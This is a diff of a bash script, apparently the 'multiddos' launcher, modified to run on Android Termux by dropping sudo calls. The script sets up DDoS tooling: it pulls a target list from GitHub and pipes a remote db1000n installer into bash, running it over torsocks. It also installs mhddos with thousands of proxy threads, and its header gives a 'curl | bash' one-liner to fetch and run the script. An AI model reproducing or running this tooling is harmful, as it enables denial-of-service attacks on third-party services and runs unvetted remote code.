@@ -1,9 +1,9 @@
 #!/bin/bash
 # Modified for work with Android termux https://github.com/termux/termux-app/releases
-# curl -Lk https://raw.githubusercontent.com/ignitedevua/multiddos/main/multiddos.sh | bash --lite -g
+# curl -Lk https://raw.githubusercontent.com/ignitedevua/multiddos/main/multiddos.sh | bash -s -- --lite -g
 clear && echo -e "Loading... v0.9a\n"
-sudo apt-get update -q -y #>/dev/null 2>&1
-sudo apt-get install -q -y tmux toilet python3 python3-pip 
+apt-get update -q -y #>/dev/null 2>&1
+apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
 rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd #delete old folder; create new and cd inside
 rm -rf ~/tmp/ 2>&1
@@ -33,9 +33,9 @@ if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # same fo
 
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
-export targets_curl=~"/tmp/curl.uaripper"
-export targets_uniq=~"/tmp/uniq.uaripper"
-export targets_lite=~"/tmp/lite.uaripper"
+export targets_curl=~/tmp/curl.uaripper
+export targets_uniq=~/tmp/uniq.uaripper
+export targets_lite=~/tmp/lite.uaripper
 rm -f /var/tmp/*uaripper #remove previous copies
 
 # read targets from github, exclude comments and empty lines, put valid addresses on new line
@@ -66,7 +66,7 @@ export -f prepare_targets_and_banner
 launch () {
 # kill previous sessions or processes in case they still in memory
 tmux kill-session -t multidd > /dev/null 2>&1
-sudo pkill node shield> /dev/null 2>&1
+pkill node shield> /dev/null 2>&1
 
 # tmux mouse support
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
@@ -75,7 +75,7 @@ tmux source-file ~/.tmux.conf > /dev/null 2>&1
 if [[ $gotop == "on" ]]; then
     if [ ! -f "/usr/local/bin/gotop" ]; then
         curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
-        sudo dpkg -i gotop.deb
+        dpkg -i gotop.deb
     fi
     tmux new-session -s multiddos -d 'gotop -sc solarized'
     tmux split-window -h -p 66 'bash auto_bash.sh'
@@ -84,12 +84,12 @@ else
 fi
 
 if [[ $vnstat == "on" ]]; then
-    sudo apt -yq install vnstat
+    apt -yq install vnstat
     tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
-    sudo apt -yq install torsocks
+    apt -yq install torsocks
     tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 fi
 
@@ -122,7 +122,7 @@ prepare_targets_and_banner
 cat > auto_bash.sh << 'EOF'
 # create swap file if system doesn't have it
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
-    sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
+    fallocate -l 1G /swp && chmod 600 /swp && mkswap /swp && swapon /swp
 fi
 
 #install mhddos and mhddos_proxy
